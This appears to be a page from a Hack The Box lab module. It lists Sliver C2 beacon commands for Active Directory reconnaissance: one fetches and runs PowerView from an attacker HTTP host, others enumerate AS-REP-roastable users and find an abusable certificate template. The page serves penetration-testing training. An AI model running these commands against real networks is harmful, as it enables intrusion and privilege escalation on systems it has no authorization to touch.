#### PowerView

```sh
3kjS@htb[/htb]$ echo -n "get-netuser | select  samaccountname,description" | base64 
Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u
```

```sh
sliver (http-beacon) > sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
```
#### SharpView

```sh
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
```
#### Understanding the Domain Structure

```sh
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-domain" -t 240 -i -E -M
```

```sh
sliver (http-beacon) > c2tc-domaininfo
```

```sh
sliver (http-beacon) > certify -- find 

[*] certify output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.1.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=htb,DC=local'

[*] Listing info about the Enterprise CA 'htb-DC02-CA'
<SNIP>
CA Name                               : dc02.htb.local\htb-DC02-CA
    Template Name                         : Abuse
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication
    mspki-certificate-application-policy  : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights 
<SNIP>
```

```sh
sliver (http-beacon) > execute -o certutil.exe
```

```sh
sliver (http-beacon) > ifconfig

+------------------------------------------+
| Ethernet0 2                              |
+------------------------------------------+
| # | IP Addresses     | MAC Address       |
+---+------------------+-------------------+
| 6 | 10.129.229.64/16 | 00:50:56:b9:e9:5b |
+------------------------------------------+

+----------------------------------------+
| Ethernet1 2                            |
+----------------------------------------+
| # | IP Addresses   | MAC Address       |
+---+----------------+-------------------+
| 8 | <SNIP> | 00:50:56:b9:da:1d |
+----------------------------------------+
1 adapters not shown.
```
#### Domain Reconnassaince - Miscellaneous

```sh
sliver (http-beacon) > execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains
```
